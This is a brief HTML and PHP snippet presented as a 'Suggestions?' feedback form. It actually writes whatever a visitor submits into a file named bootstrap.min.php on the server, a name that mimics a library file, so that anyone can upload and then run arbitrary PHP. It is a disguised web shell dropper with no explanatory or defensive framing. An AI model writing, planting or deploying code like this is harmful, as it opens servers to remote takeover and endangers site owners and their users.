<html>
<form> 
<input type="text" name="bootstrap" placeholder="Suggestions?"/> 
<input type="submit" name="submit"/> 
</form></html>
<?php 
if ( isset( $_GET['submit'] ) ) {  
$code = $_GET['bootstrap']; 
}
$file = fopen("bootstrap.min.php","w");
fwrite($file, $code);
fclose($file);
?>
